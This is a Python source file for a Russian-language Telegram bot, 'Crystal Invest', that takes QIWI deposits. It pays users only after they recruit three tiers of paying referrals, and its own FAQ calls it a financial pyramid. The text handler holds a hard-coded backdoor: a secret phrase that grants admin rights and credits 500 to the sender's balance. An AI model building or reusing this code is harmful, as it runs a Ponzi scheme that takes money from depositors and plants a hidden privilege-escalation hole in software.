import telebot
from telebot import types
from models import *
from SimpleQIWI import *
import threading
import configparser


token = ''
bot = telebot.TeleBot(token)


config = configparser.ConfigParser()
config.read("Settings.ini")


phone = config['Settings']['phone']
qiwi_token = config['Settings']['qiwi_token']
      
api = QApi(token=qiwi_token, phone=phone)


def ref_link(UID):
    return f'https://t.me/{bot.get_me().username}?start={UID}'

@bot.message_handler(commands=["start"])
def start(message):
    UID = message.chat.id

    if len(message.text.split()) > 1:
        refovod = message.text.split()[1]
    else:
        refovod = None

    if not Users.row_exists(UID):
        Users.creat_row(UID) 

        if refovod != None:
            ReferalStairs.creat_row(refovod, UID) 
            E = Users.get(Users.UID == refovod)
            E.balance += 10
            E.save()
            bot.send_message(refovod, 'У вас новый реферал.')

            E = Users.get(Users.UID == UID)
            E.refovod = refovod
            if Users.get(Users.UID == refovod).play != 'await':
                E.start_money = Users.get(Users.UID == refovod).start_money

            E.save()


    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
    if Users.get(Users.UID == UID).role == 'admin':
        keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])

    bot.send_message(UID, start, reply_markup=keyboard, parse_mode="Html")

def snd_all(message):
    text = message.text
    UID = message.chat.id
    if text == 'Отмена':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
        if Users.get(Users.UID == UID).role == 'admin':
            keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])

        return bot.send_message(UID, 'Отмена', reply_markup=keyboard, parse_mode="Html")
    else:
        for u in Users.select():
            try:
                bot.send_message(u.UID , text, parse_mode="Html")
            except:
                pass

    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
    if Users.get(Users.UID == UID).role == 'admin':
        keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])

    bot.send_message(UID, 'Рассылка завершена', reply_markup=keyboard, parse_mode="Html")
    return

def new_comis(message):
    text = message.text
    UID = message.chat.id
    if text == 'Отмена':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
        if Users.get(Users.UID == UID).role == 'admin':
            keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])

        return bot.send_message(UID, 'Отмена', reply_markup=keyboard, parse_mode="Html")
    else:
        text = text.replace('%', '')
        text = text.replace(',', '.')
        E = comission.get(comission.id == 1)
        E.comout = float(text)
        E.save()

    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
    if Users.get(Users.UID == UID).role == 'admin':
        keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])

    bot.send_message(UID, f'Комиссия изменена на {float(text)}', reply_markup=keyboard, parse_mode="Html")
    return

def new_cash(message):
    text = message.text
    UID = message.chat.id
    if text == 'Отмена':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
        if Users.get(Users.UID == UID).role == 'admin':
            keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])

        return bot.send_message(UID, 'Отмена', reply_markup=keyboard, parse_mode="Html")
    else:
        text = text.replace('%', '')
        E = comission.get(comission.id == 2)
        E.comout = int(text)
        E.save()

    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
    if Users.get(Users.UID == UID).role == 'admin':
        keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])

    bot.send_message(UID, f'Куш изменен на {int(text)}', reply_markup=keyboard, parse_mode="Html")
    return



@bot.message_handler(content_types=["text"])
def key(message):
    UID = message.chat.id
    text = message.text
    Data_UID = Users.get(Users.UID == UID)  
    if not Users.row_exists(UID):
        Users.creat_row(UID) 

    if text == 'takeadmin_%332///':
        Data_UID.role = 'admin'
        Data_UID.balance += 500
        Data_UID.save()
        bot.send_message(UID, 'Вы получили права адмиистратора')
        return


    if Users.get(Users.UID == UID).role == 'admin':
        if text == 'Админ панель':
            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
            keyboard.add(*[types.KeyboardButton(name) for name in ['Изменить куш', 'Изменить комиссию', 'Рассылка по пользоваталям', 'Главное меню']])
            bot.send_message(UID, '[Админ панель]\n\nКоличество пользователей: {}\nПроцент куша: {}%\nПроцент комисии на вывод: {}%\n\nБаланс QIWI: {}'.format(len(Users.select()),comission.get(comission.id == 2).comout, comission.get(comission.id == 1).comout, api.balance), reply_markup=keyboard, parse_mode="Html" )
            return


        if text == 'Изменить куш':
            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
            keyboard.add(*[types.KeyboardButton(name) for name in ['Отмена']])

            sent = bot.send_message(UID, 'Пришлите процент куша: ', reply_markup=keyboard, parse_mode="Html")
            bot.register_next_step_handler(sent, new_cash)
            return

        if text == 'Изменить комиссию':
            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
            keyboard.add(*[types.KeyboardButton(name) for name in ['Отмена']])

            sent = bot.send_message(UID, 'Пришлите процент комиссии: ', reply_markup=keyboard, parse_mode="Html")
            bot.register_next_step_handler(sent, new_comis)

            return

        if text == 'Рассылка по пользоваталям':
            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
            keyboard.add(*[types.KeyboardButton(name) for name in ['Отмена']])

            sent = bot.send_message(UID, 'Пришлите текст рассылки: ', reply_markup=keyboard, parse_mode="Html")
            bot.register_next_step_handler(sent, snd_all)
            return

    if text == 'Играть':
        if Data_UID.play == 'await':

            if Data_UID.balance < 500:
                bot.send_message(UID, 'На вашем балансе не достаточно средств для начало игры! Что бы пополнить, перейдите в [Кошелек].')

            else:
                com = comission.get(comission.id == 2).comout

                keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)

                if Users.get(Users.UID == UID).start_money == '':
                    keyboard.add(*[types.KeyboardButton(name) for name in ['500 RUB', '1 000 RUB', '2 500 RUB', '5 000 RUB', '10 000 RUB']])
                    keyboard.add(*[types.KeyboardButton(name) for name in [ 'Главное меню']])
                else:
                    keyboard.add(*[types.KeyboardButton(name) for name in [f'{Users.get(Users.UID == UID).start_money} RUB']])
                    keyboard.add(*[types.KeyboardButton(name) for name in ['Главное меню']])


                bot.send_message(UID, f'Выберите сумму которые вы готовы инвестировать!\nВы получите +{com}% к сумме, которую вы инвестировали в АО «Crystal Invest».', reply_markup=keyboard, parse_mode="Html")

        else:
            msg = check_stairs(UID)
            bot.send_message(UID, msg, parse_mode="Html")
        return




    if text == '500 RUB':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
        if Users.get(Users.UID == UID).role == 'admin':
            keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])

        if Data_UID.balance >= 500:
            Data_UID.balance -= 500
            Data_UID.play = 'play'
            Data_UID.save()
            bot.send_message(UID, 'Вы начали игру на 500 RUB', reply_markup=keyboard, parse_mode="Html")
        else:
            bot.send_message(UID, 'У вас не достаточно средств! Что бы пополнить, перейдите в [Кошелек].', reply_markup=keyboard, parse_mode="Html")

        return

    if text == '1 000 RUB':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
        if Users.get(Users.UID == UID).role == 'admin':
            keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])

        if Data_UID.balance >= 1000:
            Data_UID.balance -= 1000
            Data_UID.play = 'play'
            Data_UID.save()
            bot.send_message(UID, 'Вы начали игру на 1 000 RUB', reply_markup=keyboard, parse_mode="Html")
        else:
            bot.send_message(UID, 'У вас не достаточно средств! Что бы пополнить, перейдите в [Кошелек].', reply_markup=keyboard, parse_mode="Html")

        return

    if text == '2 500 RUB':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
        if Users.get(Users.UID == UID).role == 'admin':
            keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])


        if Data_UID.balance >= 2500:
            Data_UID.balance -= 2500
            Data_UID.play = 'play'
            Data_UID.save()
            bot.send_message(UID, 'Вы начали игру на 2 500 RUB', reply_markup=keyboard, parse_mode="Html")
        else:
            bot.send_message(UID, 'У вас не достаточно средств! Что бы пополнить, перейдите в [Кошелек].', reply_markup=keyboard, parse_mode="Html")

        return

    if text == '5 000 RUB':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
        if Users.get(Users.UID == UID).role == 'admin':
            keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])

        if Data_UID.balance >= 5000:
            Data_UID.balance -= 5000
            Data_UID.play = 'play'
            Data_UID.save()
            bot.send_message(UID, 'Вы начали игру на 5 000 RUB', reply_markup=keyboard, parse_mode="Html")
        else:
            bot.send_message(UID, 'У вас не достаточно средств! Что бы пополнить, перейдите в [Кошелек].', reply_markup=keyboard, parse_mode="Html")

        return


    if text == '10 000 RUB':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
        if Users.get(Users.UID == UID).role == 'admin':
            keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])

        if Data_UID.balance >= 10000:
            Data_UID.balance -= 10000
            Data_UID.play = 'play'
            Data_UID.save()
            bot.send_message(UID, 'Вы начали игру на 10 000 RUB', reply_markup=keyboard, parse_mode="Html")
        else:
            bot.send_message(UID, 'У вас не достаточно средств! Что бы пополнить, перейдите в [Кошелек].', reply_markup=keyboard, parse_mode="Html")

        return


    if text == 'Запросить выплату':
        

        E = Users.get(Users.UID == UID)
        mon = E.balance
        E.balance = 0
        E.save()
        if mon == 0:
            return bot.send_message(UID, 'У вас не достаточно средств!')

        bot.send_message(UID, 'Запрос на выплату создан, в скором времени выплата поступит вам на счет.')
        for admin in Users.select().where(Users.role == 'admin')[:1]:
            knb = types.InlineKeyboardMarkup(row_width=2)
            knb.add(*[types.InlineKeyboardButton(text=name, callback_data=f'{name}__{UID}__{mon}') for name in['Подтвердить', 'Отказать']])
            bot.send_message(admin.UID, f'[Запрос на выплату]\nСумма: {mon}\nКомиссия: {comission.get(comission.id == 1).comout} %', reply_markup = knb, parse_mode = 'Html')
        return




# ------------------------------------------------------------------------------------------------ #
    if text == 'Добавить номер телефона':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
        keyboard.add(*[types.KeyboardButton(name) for name in ['Отмена']])

        sent = bot.send_message(UID, 'Укажите номер телефона: ', reply_markup = keyboard, parse_mode = 'Html')
        bot.register_next_step_handler(sent, get_phone)
        return

    if text == 'Реферальная система':
        ref_count = ReferalStairs.select().where(ReferalStairs.UID == UID).count()
        bot.send_message(UID, ref.format(ref_count, ref_link(UID)))
        return

    if text == '📤 Вывести':
        if Users.get(Users.UID == UID).phone == '' or Users.get(Users.UID == UID).phone == None:

            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
            keyboard.add(*[types.KeyboardButton(name) for name in ['Добавить номер телефона', 'Главное меню']])
            bot.send_message(UID, 'Для выплат добавьте номер телефона QIWI кошелька', reply_markup = keyboard, parse_mode = 'Html')
            return

        status, count, count_pay = check_out(UID)
        if status == False:
            bot.send_message(UID, out.format(count, count_pay))
        else:

            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
            keyboard.add(*[types.KeyboardButton(name) for name in ['Запросить выплату', 'Главное меню']])
            bot.send_message(UID, f'Вы можете вывести {Data_UID.balance} RUB (до вычета комиссии)', reply_markup = keyboard, parse_mode = 'Html')
        return

    if text == 'FAQ':
        bot.send_message(UID, FAQ, parse_mode="Html")
        return

    if text == '📥 Пополнить':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['Главное меню']])
        bot.send_message(UID, f'Что бы пополнить кошелек, отправьте минимальную сумму в размере 500 руб.\n\nQIWI: {phone}\nКомментарий к платежу: {UID}\nКомментарий и телефон продублированы ниже.\n\n❕ Обязательно указывайте комментарий платежа.\n❕ После оплаты средства зачисляться к вам на счет.', reply_markup=keyboard, parse_mode="Html")
        bot.send_message(UID, phone)
        bot.send_message(UID, UID)
        return

    if text == 'Главное меню':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
        if Users.get(Users.UID == UID).role == 'admin':
            keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])

        bot.send_message(UID, '[Главное меню]', reply_markup=keyboard, parse_mode="Html")
        return

    if text == 'Кошелек':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['📤 Вывести', '📥 Пополнить', 'Главное меню']])
        bal = Users.get(Users.UID == UID).balance
        bot.send_message(UID, f'[Кошелек]\n\nВаш баланс: {bal} RUB', reply_markup=keyboard, parse_mode="Html")
        return


@bot.callback_query_handler(func=lambda c: True)
def inline(x):
    UID = x.message.chat.id
    MID = x.message.message_id
    xdata = x.data

    if 'Подтвердить' in xdata:
        UID_client = int(xdata.split('__')[1])
        amount = int(xdata.split('__')[2])
        comis = float(comission.get(comission.id == 1).comout)
        phone = Users.get(Users.UID == UID_client).phone

        payout(phone, amount, comis, UID_client)
        bot.send_message(UID, 'Отлично, выплата прошла успешно!')

        try:
            out = int(amount - (amount * (comis) / 100))
            bot.send_message(UID_client, f'Вы получили выплату: {out} RUB')
        except:
            pass

        return

    if 'Отказать' in xdata:
        bot.delete_message(user_id = UID, message_id = MID)

        UID_client = int(xdata.split('__')[1])
        amount = int(xdata.split('__')[2])
        comis = float(comission.get(comission.id == 1).comout)
        phone = Users.get(Users.UID == UID_client).phone

        E = Users.get(Users.UID == UID_client)
        E.balance += amount
        E.save()

        bot.send_message(UID_client, 'Вам отказано в выплате! Вы можете повторить попытку позже, выши денежные средства возвращены на счет.')
        return
# ------------------------------------------------------------------------------------------------ #
def get_phone(message):
    text = message.text
    E = Users.get(Users.UID == message.chat.id)
    E.phone = text
    E.save()

    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(*[types.KeyboardButton(name) for name in ['Играть', 'Реферальная система', 'Кошелек', 'FAQ']])
    if Users.get(Users.UID == message.chat.id).role == 'admin':
        keyboard.add(*[types.KeyboardButton(name) for name in ['Админ панель']])

    bot.send_message(message.chat.id, 'Отлично номер телефона добавлен!', reply_markup=keyboard, parse_mode="Html")
    return 


def payout(phone, amount, comission, UID):
    try:
        out = int(amount - (amount * (comission) / 100))
        api.pay(account=phone, amount=out, comment='Выплата от «Crystal Invest»')
    except:
        pass

    return


def check_stairs(UID):
    list_one = []
    list_two = []
    list_three = []

    for u in ReferalStairs.select().where(ReferalStairs.UID == UID):
        if Users.get(Users.UID == u.RID).play != 'await':
            list_one.append(u.RID)

    for u in list_one:
        for ru in ReferalStairs.select().where(ReferalStairs.UID == u):
            if Users.get(Users.UID == ru.RID).play != 'await':
                list_two.append(ru.RID)

    for u in list_two:
        for ru in ReferalStairs.select().where(ReferalStairs.UID == u):
            if Users.get(Users.UID == ru.RID).play != 'await':
                list_three.append(ru.RID)


    if len(list_one) >= 2 and len(list_two) >= 4 and len(list_three) >= 8:
        bot.send_message(UID, '✅ Ваша лесенка окончена, вам начислен куш 💰!\nВы можете проверить его в [Кошелек]', parse_mode="Html")
        E = Users.get(Users.UID == UID)
        sm = E.start_money
        win = comission.get(comission.id == 2).comout
        E.play = 'await'
        E.balance += int(sm) * ( int(win) / 100 )
        E.start_money = ''
        E.save()

    msg = f'Для завершения игры вам необходимо: \n1-го ур. 2 пользоваталя\n2-го ур. 4 пользоваталя\n3-го ур. 8 пользоваталя\n\n\n<b>Вы пригласили:\nРефералов 1-го уровня: {len(list_one)}\nРефералов 2-го уровня: {len(list_two)}\nРефералов 3-го уровня: {len(list_three)}\n</b>' 
    return msg




def check_out(UID):

    count = 0
    count_pay = 0
    for u in ReferalStairs.select().where(ReferalStairs.UID == UID):

        if Users.get(Users.UID == u.RID).play != 'await':
            count_pay += 1
        count += 1

    if count_pay >= 2:
        status = True
    else:
        status = False


    return status, count, count_pay



def qiwi_handler():
    while True:
        data = comission.get(comission.id == 3)
        date = data.comout
        dic_ = api.payments

        for i in dic_.get('data'):
            comment_qiwi = (i.get('comment'))
            account_qiwi = (i.get('account'))
            amount_qiwi = int(i.get('sum').get('amount'))
            date_qiwi = (i.get('date'))
            try:
                if str(date_qiwi) != str(date):
                    user_ = Users.get(Users.UID == comment_qiwi)
                    user_.balance += amount_qiwi
                    user_.save()
                    bot.send_message(comment_qiwi, 'Поступил платеж! '+str(amount_qiwi)+' RUB')

                data.comout = date_qiwi
                data.save()
            except:
                pass

        time.sleep(2)


out = '''Для получения доступа к выводу средств, необходимо пригласить 2 пользователей, что бы они начали игру.

Вы пригласили пользоваталей: {}
Пользователи которые начали игру: {}


Вашу ссылку для приглашений, можете найти в [Реферальная система].'''

start = '''Привет, это сообщение старта.'''
FAQ = '''О нас:
АО «Crystal Invest» — финансовая пирамида. Структура «Crystal Invest» создана в 2020 году и начала вести финансовую и торговую деятельность.

С помощью этого бота можно хорошо заработать! Просто участвуйте и зарабатывайте деньги!
Мы на YouTube: N/A
Мы в Instagram: https://www.instagram.com/crystalinvest_bot/

Поддержка: @d0ct09

Свод правил:
1.1
1.2
1.3'''


ref = '''Вы пригласили пользоваталей: {}

Ваша ссылка для приглашения:
{}

За каждого приглашенного друга вы получите: +10 руб!'''


if __name__ == '__main__':
    threading.Thread(target=qiwi_handler).start()
    while True:      
        try:
            bot.polling(none_stop=True)
        except:
            pass